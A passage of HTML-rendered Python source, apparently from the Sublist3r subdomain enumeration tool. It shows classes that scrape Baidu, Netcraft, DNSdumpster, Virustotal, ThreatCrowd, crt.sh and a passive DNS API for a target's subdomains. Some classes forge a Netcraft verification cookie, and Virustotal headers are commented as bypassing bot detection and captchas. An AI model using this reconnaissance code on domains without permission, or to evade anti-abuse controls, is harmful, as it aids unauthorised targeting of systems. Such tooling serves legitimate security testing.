class="params">self, domain, subdomains=<span class="literal">None</span>, q=<span class="literal">None</span>, silent=<span class="literal">False</span>, verbose=<span class="literal">True</span></span>):</span><br><span class="line">        subdomains = subdomains <span class="keyword">or</span> []</span><br><span class="line">        base_url = <span class="string">&#x27;https://www.baidu.com/s?pn=&#123;page_no&#125;&amp;wd=&#123;query&#125;&amp;oq=&#123;query&#125;&#x27;</span></span><br><span class="line">        self.engine_name = <span class="string">&quot;Baidu&quot;</span></span><br><span class="line">        self.MAX_DOMAINS = <span class="number">2</span></span><br><span class="line">        self.MAX_PAGES = <span class="number">760</span></span><br><span class="line">        enumratorBaseThreaded.__init__(self, base_url, self.engine_name, domain, subdomains, q=q, silent=silent, verbose=verbose)</span><br><span class="line">        self.querydomain = self.domain</span><br><span class="line">        self.q = q</span><br><span class="line">        <span class="keyword">return</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">extract_domains</span>(<span class="params">self, resp</span>):</span><br><span class="line">        links = <span class="built_in">list</span>()</span><br><span class="line">        found_newdomain = <span class="literal">False</span></span><br><span class="line">        subdomain_list = []</span><br><span class="line">        link_regx = re.<span class="built_in">compile</span>(<span class="string">&#x27;&lt;a.*?class=&quot;c-showurl&quot;.*?&gt;(.*?)&lt;/a&gt;&#x27;</span>)</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            links = link_regx.findall(resp)</span><br><span class="line">            <span class="keyword">for</span> link <span class="keyword">in</span> links:</span><br><span class="line">                link = re.sub(<span class="string">&#x27;&lt;.*?&gt;|&gt;|&lt;|&amp;nbsp;&#x27;</span>, <span class="string">&#x27;&#x27;</span>, link)</span><br><span class="line">                <span class="keyword">if</span> <span class="keyword">not</span> link.startswith(<span class="string">&#x27;http&#x27;</span>):</span><br><span class="line">                    link = <span class="string">&quot;http://&quot;</span> + link</span><br><span class="line">                subdomain = urlparse.urlparse(link).netloc</span><br><span class="line">                <span class="keyword">if</span> subdomain.endswith(self.domain):</span><br><span class="line">                    subdomain_list.append(subdomain)</span><br><span class="line">                    <span class="keyword">if</span> subdomain <span class="keyword">not</span> <span class="keyword">in</span> self.subdomains <span class="keyword">and</span> subdomain != self.domain:</span><br><span class="line">                        found_newdomain = <span class="literal">True</span></span><br><span class="line">                        <span class="keyword">if</span> self.verbose:</span><br><span class="line">                            self.print_(<span class="string">&quot;%s%s: %s%s&quot;</span> % (R, self.engine_name, W, subdomain))</span><br><span class="line">                        self.subdomains.append(subdomain.strip())</span><br><span class="line">        <span class="keyword">except</span> Exception:</span><br><span class="line">            <span class="keyword">pass</span></span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> found_newdomain <span class="keyword">and</span> subdomain_list:</span><br><span class="line">            self.querydomain = self.findsubs(subdomain_list)</span><br><span class="line">        <span class="keyword">return</span> links</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">findsubs</span>(<span class="params">self, subdomains</span>):</span><br><span class="line">        count = Counter(subdomains)</span><br><span class="line">        subdomain1 = <span class="built_in">max</span>(count, key=count.get)</span><br><span class="line">        count.pop(subdomain1, <span class="string">&quot;None&quot;</span>)</span><br><span class="line">        subdomain2 = <span class="built_in">max</span>(count, key=count.get) <span class="keyword">if</span> count <span class="keyword">else</span> <span class="string">&#x27;&#x27;</span></span><br><span class="line">        <span class="keyword">return</span> (subdomain1, subdomain2)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">check_response_errors</span>(<span class="params">self, resp</span>):</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">should_sleep</span>(<span class="params">self</span>):</span><br><span class="line">        time.sleep(random.randint(<span class="number">2</span>, <span class="number">5</span>))</span><br><span class="line">        <span class="keyword">return</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">generate_query</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="keyword">if</span> self.subdomains <span class="keyword">and</span> self.querydomain != self.domain:</span><br><span class="line">            found = <span class="string">&#x27; -site:&#x27;</span>.join(self.querydomain)</span><br><span class="line">            query = <span class="string">&quot;site:&#123;domain&#125; -site:www.&#123;domain&#125; -site:&#123;found&#125; &quot;</span>.<span class="built_in">format</span>(domain=self.domain, found=found)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            query = <span class="string">&quot;site:&#123;domain&#125; -site:www.&#123;domain&#125;&quot;</span>.<span class="built_in">format</span>(domain=self.domain)</span><br><span class="line">        <span class="keyword">return</span> query</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">NetcraftEnum</span>(<span class="title class_ inherited__">enumratorBaseThreaded</span>):</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, domain, subdomains=<span class="literal">None</span>, q=<span class="literal">None</span>, silent=<span class="literal">False</span>, verbose=<span class="literal">True</span></span>):</span><br><span class="line">        subdomains = subdomains <span class="keyword">or</span> []</span><br><span class="line">        self.base_url = <span class="string">&#x27;https://searchdns.netcraft.com/?restriction=site+ends+with&amp;host=&#123;domain&#125;&#x27;</span></span><br><span class="line">        self.engine_name = <span class="string">&quot;Netcraft&quot;</span></span><br><span class="line">        <span class="built_in">super</span>(NetcraftEnum, self).__init__(self.base_url, self.engine_name, domain, subdomains, q=q, silent=silent, verbose=verbose)</span><br><span class="line">        self.q = q</span><br><span class="line">        <span class="keyword">return</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">req</span>(<span class="params">self, url, cookies=<span class="literal">None</span></span>):</span><br><span class="line">        cookies = cookies <span class="keyword">or</span> &#123;&#125;</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            resp = self.session.get(url, headers=self.headers, timeout=self.timeout, cookies=cookies)</span><br><span class="line">        <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">            self.print_(e)</span><br><span class="line">            resp = <span class="literal">None</span></span><br><span class="line">        <span class="keyword">return</span> resp</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">should_sleep</span>(<span class="params">self</span>):</span><br><span class="line">        time.sleep(random.randint(<span class="number">1</span>, <span class="number">2</span>))</span><br><span class="line">        <span class="keyword">return</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">get_next</span>(<span class="params">self, resp</span>):</span><br><span class="line">        link_regx = re.<span class="built_in">compile</span>(<span class="string">&#x27;&lt;a.*?href=&quot;(.*?)&quot;&gt;Next Page&#x27;</span>)</span><br><span class="line">        link = link_regx.findall(resp)</span><br><span class="line">        url = <span class="string">&#x27;http://searchdns.netcraft.com&#x27;</span> + link[<span class="number">0</span>]</span><br><span class="line">        <span class="keyword">return</span> url</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">create_cookies</span>(<span class="params">self, cookie</span>):</span><br><span class="line">        cookies = <span class="built_in">dict</span>()</span><br><span class="line">        cookies_list = cookie[<span class="number">0</span>:cookie.find(<span class="string">&#x27;;&#x27;</span>)].split(<span class="string">&quot;=&quot;</span>)</span><br><span class="line">        cookies[cookies_list[<span class="number">0</span>]] = cookies_list[<span class="number">1</span>]</span><br><span class="line">        <span class="comment"># hashlib.sha1 requires utf-8 encoded str</span></span><br><span class="line">        cookies[<span class="string">&#x27;netcraft_js_verification_response&#x27;</span>] = hashlib.sha1(urllib.unquote(cookies_list[<span class="number">1</span>]).encode(<span class="string">&#x27;utf-8&#x27;</span>)).hexdigest()</span><br><span class="line">        <span class="keyword">return</span> cookies</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">get_cookies</span>(<span class="params">self, headers</span>):</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&#x27;set-cookie&#x27;</span> <span class="keyword">in</span> headers:</span><br><span class="line">            cookies = self.create_cookies(headers[<span class="string">&#x27;set-cookie&#x27;</span>])</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            cookies = &#123;&#125;</span><br><span class="line">        <span class="keyword">return</span> cookies</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">enumerate</span>(<span class="params">self</span>):</span><br><span class="line">        start_url = self.base_url.<span class="built_in">format</span>(domain=<span class="string">&#x27;example.com&#x27;</span>)</span><br><span class="line">        resp = self.req(start_url)</span><br><span class="line">        cookies = self.get_cookies(resp.headers)</span><br><span class="line">        url = self.base_url.<span class="built_in">format</span>(domain=self.domain)</span><br><span class="line">        <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">            resp = self.get_response(self.req(url, cookies))</span><br><span class="line">            self.extract_domains(resp)</span><br><span class="line">            <span class="keyword">if</span> <span class="string">&#x27;Next Page&#x27;</span> <span class="keyword">not</span> <span class="keyword">in</span> resp:</span><br><span class="line">                <span class="keyword">return</span> self.subdomains</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">            url = self.get_next(resp)</span><br><span class="line">            self.should_sleep()</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">extract_domains</span>(<span class="params">self, resp</span>):</span><br><span class="line">        links_list = <span class="built_in">list</span>()</span><br><span class="line">        link_regx = re.<span class="built_in">compile</span>(<span class="string">&#x27;&lt;a class=&quot;results-table__host&quot; href=&quot;(.*?)&quot;&#x27;</span>)</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            links_list = link_regx.findall(resp)</span><br><span class="line">            <span class="keyword">for</span> link <span class="keyword">in</span> links_list:</span><br><span class="line">                subdomain = urlparse.urlparse(link).netloc</span><br><span class="line">                <span class="keyword">if</span> <span class="keyword">not</span> subdomain.endswith(self.domain):</span><br><span class="line">                    <span class="keyword">continue</span></span><br><span class="line">                <span class="keyword">if</span> subdomain <span class="keyword">and</span> subdomain <span class="keyword">not</span> <span class="keyword">in</span> self.subdomains <span class="keyword">and</span> subdomain != self.domain:</span><br><span class="line">                    <span class="keyword">if</span> self.verbose:</span><br><span class="line">                        self.print_(<span class="string">&quot;%s%s: %s%s&quot;</span> % (R, self.engine_name, W, subdomain))</span><br><span class="line">                    self.subdomains.append(subdomain.strip())</span><br><span class="line">        <span class="keyword">except</span> Exception:</span><br><span class="line">            <span class="keyword">pass</span></span><br><span class="line">        <span class="keyword">return</span> links_list</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">DNSdumpster</span>(<span class="title class_ inherited__">enumratorBaseThreaded</span>):</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, domain, subdomains=<span class="literal">None</span>, q=<span class="literal">None</span>, silent=<span class="literal">False</span>, verbose=<span class="literal">True</span></span>):</span><br><span class="line">        subdomains = subdomains <span class="keyword">or</span> []</span><br><span class="line">        base_url = <span class="string">&#x27;https://dnsdumpster.com/&#x27;</span></span><br><span class="line">        self.live_subdomains = []</span><br><span class="line">        self.engine_name = <span class="string">&quot;DNSdumpster&quot;</span></span><br><span class="line">        self.q = q</span><br><span class="line">        self.lock = <span class="literal">None</span></span><br><span class="line">        <span class="built_in">super</span>(DNSdumpster, self).__init__(base_url, self.engine_name, domain, subdomains, q=q, silent=silent, verbose=verbose)</span><br><span class="line">        <span class="keyword">return</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">check_host</span>(<span class="params">self, host</span>):</span><br><span class="line">        is_valid = <span class="literal">False</span></span><br><span class="line">        Resolver = dns.resolver.Resolver()</span><br><span class="line">        Resolver.nameservers = [<span class="string">&#x27;8.8.8.8&#x27;</span>, <span class="string">&#x27;8.8.4.4&#x27;</span>]</span><br><span class="line">        self.lock.acquire()</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            ip = Resolver.query(host, <span class="string">&#x27;A&#x27;</span>)[<span class="number">0</span>].to_text()</span><br><span class="line">            <span class="keyword">if</span> ip:</span><br><span class="line">                <span class="keyword">if</span> self.verbose:</span><br><span class="line">                    self.print_(<span class="string">&quot;%s%s: %s%s&quot;</span> % (R, self.engine_name, W, host))</span><br><span class="line">                is_valid = <span class="literal">True</span></span><br><span class="line">                self.live_subdomains.append(host)</span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            <span class="keyword">pass</span></span><br><span class="line">        self.lock.release()</span><br><span class="line">        <span class="keyword">return</span> is_valid</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">req</span>(<span class="params">self, req_method, url, params=<span class="literal">None</span></span>):</span><br><span class="line">        params = params <span class="keyword">or</span> &#123;&#125;</span><br><span class="line">        headers = <span class="built_in">dict</span>(self.headers)</span><br><span class="line">        headers[<span class="string">&#x27;Referer&#x27;</span>] = <span class="string">&#x27;https://dnsdumpster.com&#x27;</span></span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            <span class="keyword">if</span> req_method == <span class="string">&#x27;GET&#x27;</span>:</span><br><span class="line">                resp = self.session.get(url, headers=headers, timeout=self.timeout)</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                resp = self.session.post(url, data=params, headers=headers, timeout=self.timeout)</span><br><span class="line">        <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">            self.print_(e)</span><br><span class="line">            resp = <span class="literal">None</span></span><br><span class="line">        <span class="keyword">return</span> self.get_response(resp)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">get_csrftoken</span>(<span class="params">self, resp</span>):</span><br><span class="line">        csrf_regex = re.<span class="built_in">compile</span>(<span class="string">&#x27;&lt;input type=&quot;hidden&quot; name=&quot;csrfmiddlewaretoken&quot; value=&quot;(.*?)&quot;&gt;&#x27;</span>, re.S)</span><br><span class="line">        token = csrf_regex.findall(resp)[<span class="number">0</span>]</span><br><span class="line">        <span class="keyword">return</span> token.strip()</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">enumerate</span>(<span class="params">self</span>):</span><br><span class="line">        self.lock = threading.BoundedSemaphore(value=<span class="number">70</span>)</span><br><span class="line">        resp = self.req(<span class="string">&#x27;GET&#x27;</span>, self.base_url)</span><br><span class="line">        token = self.get_csrftoken(resp)</span><br><span class="line">        params = &#123;<span class="string">&#x27;csrfmiddlewaretoken&#x27;</span>: token, <span class="string">&#x27;targetip&#x27;</span>: self.domain&#125;</span><br><span class="line">        post_resp = self.req(<span class="string">&#x27;POST&#x27;</span>, self.base_url, params)</span><br><span class="line">        self.extract_domains(post_resp)</span><br><span class="line">        <span class="keyword">for</span> subdomain <span class="keyword">in</span> self.subdomains:</span><br><span class="line">            t = threading.Thread(target=self.check_host, args=(subdomain,))</span><br><span class="line">            t.start()</span><br><span class="line">            t.join()</span><br><span class="line">        <span class="keyword">return</span> self.live_subdomains</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">extract_domains</span>(<span class="params">self, resp</span>):</span><br><span class="line">        tbl_regex = re.<span class="built_in">compile</span>(<span class="string">&#x27;&lt;a name=&quot;hostanchor&quot;&gt;&lt;\/a&gt;Host Records.*?&lt;table.*?&gt;(.*?)&lt;/table&gt;&#x27;</span>, re.S)</span><br><span class="line">        link_regex = re.<span class="built_in">compile</span>(<span class="string">&#x27;&lt;td class=&quot;col-md-4&quot;&gt;(.*?)&lt;br&gt;&#x27;</span>, re.S)</span><br><span class="line">        links = []</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            results_tbl = tbl_regex.findall(resp)[<span class="number">0</span>]</span><br><span class="line">        <span class="keyword">except</span> IndexError:</span><br><span class="line">            results_tbl = <span class="string">&#x27;&#x27;</span></span><br><span class="line">        links_list = link_regex.findall(results_tbl)</span><br><span class="line">        links = <span class="built_in">list</span>(<span class="built_in">set</span>(links_list))</span><br><span class="line">        <span class="keyword">for</span> link <span class="keyword">in</span> links:</span><br><span class="line">            subdomain = link.strip()</span><br><span class="line">            <span class="keyword">if</span> <span class="keyword">not</span> subdomain.endswith(self.domain):</span><br><span class="line">                <span class="keyword">continue</span></span><br><span class="line">            <span class="keyword">if</span> subdomain <span class="keyword">and</span> subdomain <span class="keyword">not</span> <span class="keyword">in</span> self.subdomains <span class="keyword">and</span> subdomain != self.domain:</span><br><span class="line">                self.subdomains.append(subdomain.strip())</span><br><span class="line">        <span class="keyword">return</span> links</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Virustotal</span>(<span class="title class_ inherited__">enumratorBaseThreaded</span>):</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, domain, subdomains=<span class="literal">None</span>, q=<span class="literal">None</span>, silent=<span class="literal">False</span>, verbose=<span class="literal">True</span></span>):</span><br><span class="line">        subdomains = subdomains <span class="keyword">or</span> []</span><br><span class="line">        base_url = <span class="string">&#x27;https://www.virustotal.com/ui/domains/&#123;domain&#125;/subdomains?relationships=resolutions&#x27;</span></span><br><span class="line">        self.engine_name = <span class="string">&quot;Virustotal&quot;</span></span><br><span class="line">        self.q = q</span><br><span class="line">        <span class="built_in">super</span>(Virustotal, self).__init__(base_url, self.engine_name, domain, subdomains, q=q, silent=silent, verbose=verbose)</span><br><span class="line">        self.url = self.base_url.<span class="built_in">format</span>(domain=self.domain)</span><br><span class="line"></span><br><span class="line">        <span class="comment"># Virustotal requires specific headers to bypass the bot detection:</span></span><br><span class="line">        self.headers[<span class="string">&quot;X-Tool&quot;</span>] = <span class="string">&quot;vt-ui-main&quot;</span></span><br><span class="line">        self.headers[<span class="string">&quot;X-VT-Anti-Abuse-Header&quot;</span>] = <span class="string">&quot;hm&quot;</span>  <span class="comment"># as of 1/20/2022, the content of this header doesn&#x27;t matter, just its presence</span></span><br><span class="line">        self.headers[<span class="string">&quot;Accept-Ianguage&quot;</span>] = self.headers[<span class="string">&quot;Accept-Language&quot;</span>]  <span class="comment"># this header being present is required to prevent a captcha</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># the main send_req need to be rewritten</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">send_req</span>(<span class="params">self, url</span>):</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            resp = self.session.get(url, headers=self.headers, timeout=self.timeout)</span><br><span class="line">        <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">            self.print_(e)</span><br><span class="line">            resp = <span class="literal">None</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> self.get_response(resp)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># once the send_req is rewritten we don&#x27;t need to call this function, the stock one should be ok</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">enumerate</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="keyword">while</span> self.url != <span class="string">&#x27;&#x27;</span>:</span><br><span class="line">            resp = self.send_req(self.url)</span><br><span class="line">            resp = json.loads(resp)</span><br><span class="line">            <span class="keyword">if</span> <span class="string">&#x27;error&#x27;</span> <span class="keyword">in</span> resp:</span><br><span class="line">                self.print_(R + <span class="string">&quot;[!] Error: Virustotal probably now is blocking our requests&quot;</span> + W)</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">            <span class="keyword">if</span> <span class="string">&#x27;links&#x27;</span> <span class="keyword">in</span> resp <span class="keyword">and</span> <span class="string">&#x27;next&#x27;</span> <span class="keyword">in</span> resp[<span class="string">&#x27;links&#x27;</span>]:</span><br><span class="line">                self.url = resp[<span class="string">&#x27;links&#x27;</span>][<span class="string">&#x27;next&#x27;</span>]</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                self.url = <span class="string">&#x27;&#x27;</span></span><br><span class="line">            self.extract_domains(resp)</span><br><span class="line">        <span class="keyword">return</span> self.subdomains</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">extract_domains</span>(<span class="params">self, resp</span>):</span><br><span class="line">        <span class="comment">#resp is already parsed as json</span></span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            <span class="keyword">for</span> i <span class="keyword">in</span> resp[<span class="string">&#x27;data&#x27;</span>]:</span><br><span class="line">                <span class="keyword">if</span> i[<span class="string">&#x27;type&#x27;</span>] == <span class="string">&#x27;domain&#x27;</span>:</span><br><span class="line">                    subdomain = i[<span class="string">&#x27;id&#x27;</span>]</span><br><span class="line">                    <span class="keyword">if</span> <span class="keyword">not</span> subdomain.endswith(self.domain):</span><br><span class="line">                        <span class="keyword">continue</span></span><br><span class="line">                    <span class="keyword">if</span> subdomain <span class="keyword">not</span> <span class="keyword">in</span> self.subdomains <span class="keyword">and</span> subdomain != self.domain:</span><br><span class="line">                        <span class="keyword">if</span> self.verbose:</span><br><span class="line">                            self.print_(<span class="string">&quot;%s%s: %s%s&quot;</span> % (R, self.engine_name, W, subdomain))</span><br><span class="line">                        self.subdomains.append(subdomain.strip())</span><br><span class="line">        <span class="keyword">except</span> Exception:</span><br><span class="line">            <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">ThreatCrowd</span>(<span class="title class_ inherited__">enumratorBaseThreaded</span>):</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, domain, subdomains=<span class="literal">None</span>, q=<span class="literal">None</span>, silent=<span class="literal">False</span>, verbose=<span class="literal">True</span></span>):</span><br><span class="line">        subdomains = subdomains <span class="keyword">or</span> []</span><br><span class="line">        base_url = <span class="string">&#x27;https://www.threatcrowd.org/searchApi/v2/domain/report/?domain=&#123;domain&#125;&#x27;</span></span><br><span class="line">        self.engine_name = <span class="string">&quot;ThreatCrowd&quot;</span></span><br><span class="line">        self.q = q</span><br><span class="line">        <span class="built_in">super</span>(ThreatCrowd, self).__init__(base_url, self.engine_name, domain, subdomains, q=q, silent=silent, verbose=verbose)</span><br><span class="line">        <span class="keyword">return</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">req</span>(<span class="params">self, url</span>):</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            resp = self.session.get(url, headers=self.headers, timeout=self.timeout)</span><br><span class="line">        <span class="keyword">except</span> Exception:</span><br><span class="line">            resp = <span class="literal">None</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> self.get_response(resp)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">enumerate</span>(<span class="params">self</span>):</span><br><span class="line">        url = self.base_url.<span class="built_in">format</span>(domain=self.domain)</span><br><span class="line">        resp = self.req(url)</span><br><span class="line">        self.extract_domains(resp)</span><br><span class="line">        <span class="keyword">return</span> self.subdomains</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">extract_domains</span>(<span class="params">self, resp</span>):</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            links = json.loads(resp)[<span class="string">&#x27;subdomains&#x27;</span>]</span><br><span class="line">            <span class="keyword">for</span> link <span class="keyword">in</span> links:</span><br><span class="line">                subdomain = link.strip()</span><br><span class="line">                <span class="keyword">if</span> <span class="keyword">not</span> subdomain.endswith(self.domain):</span><br><span class="line">                    <span class="keyword">continue</span></span><br><span class="line">                <span class="keyword">if</span> subdomain <span class="keyword">not</span> <span class="keyword">in</span> self.subdomains <span class="keyword">and</span> subdomain != self.domain:</span><br><span class="line">                    <span class="keyword">if</span> self.verbose:</span><br><span class="line">                        self.print_(<span class="string">&quot;%s%s: %s%s&quot;</span> % (R, self.engine_name, W, subdomain))</span><br><span class="line">                    self.subdomains.append(subdomain.strip())</span><br><span class="line">        <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">            <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">CrtSearch</span>(<span class="title class_ inherited__">enumratorBaseThreaded</span>):</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, domain, subdomains=<span class="literal">None</span>, q=<span class="literal">None</span>, silent=<span class="literal">False</span>, verbose=<span class="literal">True</span></span>):</span><br><span class="line">        subdomains = subdomains <span class="keyword">or</span> []</span><br><span class="line">        base_url = <span class="string">&#x27;https://crt.sh/?q=%25.&#123;domain&#125;&#x27;</span></span><br><span class="line">        self.engine_name = <span class="string">&quot;SSL Certificates&quot;</span></span><br><span class="line">        self.q = q</span><br><span class="line">        <span class="built_in">super</span>(CrtSearch, self).__init__(base_url, self.engine_name, domain, subdomains, q=q, silent=silent, verbose=verbose)</span><br><span class="line">        <span class="keyword">return</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">req</span>(<span class="params">self, url</span>):</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            resp = self.session.get(url, headers=self.headers, timeout=self.timeout)</span><br><span class="line">        <span class="keyword">except</span> Exception:</span><br><span class="line">            resp = <span class="literal">None</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> self.get_response(resp)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">enumerate</span>(<span class="params">self</span>):</span><br><span class="line">        url = self.base_url.<span class="built_in">format</span>(domain=self.domain)</span><br><span class="line">        resp = self.req(url)</span><br><span class="line">        <span class="keyword">if</span> resp:</span><br><span class="line">            self.extract_domains(resp)</span><br><span class="line">        <span class="keyword">return</span> self.subdomains</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">extract_domains</span>(<span class="params">self, resp</span>):</span><br><span class="line">        link_regx = re.<span class="built_in">compile</span>(<span class="string">&#x27;&lt;TD&gt;(.*?)&lt;/TD&gt;&#x27;</span>)</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            links = link_regx.findall(resp)</span><br><span class="line">            <span class="keyword">for</span> link <span class="keyword">in</span> links:</span><br><span class="line">                link = link.strip()</span><br><span class="line">                subdomains = []</span><br><span class="line">                <span class="keyword">if</span> <span class="string">&#x27;&lt;BR&gt;&#x27;</span> <span class="keyword">in</span> link:</span><br><span class="line">                    subdomains = link.split(<span class="string">&#x27;&lt;BR&gt;&#x27;</span>)</span><br><span class="line">                <span class="keyword">else</span>:</span><br><span class="line">                    subdomains.append(link)</span><br><span class="line"></span><br><span class="line">                <span class="keyword">for</span> subdomain <span class="keyword">in</span> subdomains:</span><br><span class="line">                    <span class="keyword">if</span> <span class="keyword">not</span> subdomain.endswith(self.domain) <span class="keyword">or</span> <span class="string">&#x27;*&#x27;</span> <span class="keyword">in</span> subdomain:</span><br><span class="line">                        <span class="keyword">continue</span></span><br><span class="line"></span><br><span class="line">                    <span class="keyword">if</span> <span class="string">&#x27;@&#x27;</span> <span class="keyword">in</span> subdomain:</span><br><span class="line">                        subdomain = subdomain[subdomain.find(<span class="string">&#x27;@&#x27;</span>)+<span class="number">1</span>:]</span><br><span class="line"></span><br><span class="line">                    <span class="keyword">if</span> subdomain <span class="keyword">not</span> <span class="keyword">in</span> self.subdomains <span class="keyword">and</span> subdomain != self.domain:</span><br><span class="line">                        <span class="keyword">if</span> self.verbose:</span><br><span class="line">                            self.print_(<span class="string">&quot;%s%s: %s%s&quot;</span> % (R, self.engine_name, W, subdomain))</span><br><span class="line">                        self.subdomains.append(subdomain.strip())</span><br><span class="line">        <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">            <span class="built_in">print</span>(e)</span><br><span class="line">            <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">PassiveDNS</span>(<span class="title class_ inherited__">enumratorBaseThreaded</span>):</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, domain, subdomains=<span class="literal">None</span>, q=<span class="literal">None</span>, silent=<span class="literal">False</span>, verbose=<span class="literal">True</span></span>):</span><br><span class="line">        subdomains = subdomains <span class="keyword">or</span> []</span><br><span class="line">        base_url = <span class="string">&#x27;https://api.sublist3r.com/search.php?domain=&#123;domain&#125;&#x27;</span></span><br><span class="line">        self.engine_name = <span class="string">&quot;PassiveDNS&quot;</span></span><br><span class="line">        self.q = q</span><br><span class="line">        <span class="built_in">super</span>(PassiveDNS, self).__init__(base_url, self.engine_name, domain, subdomains, q=q, silent=silent, verbose=verbose)</span><br><span class="line">        <span class="keyword">return</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">req</span>(<span class="params">self, url</span>):</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            resp = self.session.get(url, headers=self.headers, timeout=self.timeout)</span><br><span class="line">        <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">            resp = <span class="literal">None</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> self.get_response(resp)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">enumerate</span>(<span class="params">self</span>):</span><br><span class="line">        url = self.base_url.<span class="built_in">format</span>(domain=self.domain)</span><br><span class="line">        resp = self.req(url)</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> resp:</span><br><span class="line">            <span class="keyword">return</span> self.subdomains</span><br><span class="line"></span><br><span class="line">        self.extract_domains(resp)</span><br><span class="line">        <span class="keyword">return</span> self.subdomains</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">extract_domains</span>(<span class="params">self, resp</span>):</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            subdomains = json.loads(resp)</span><br><span class="line">            <span class="keyword">for</span> subdomain <span class="keyword">in</span> subdomains:</span><br><span class="line">                <span 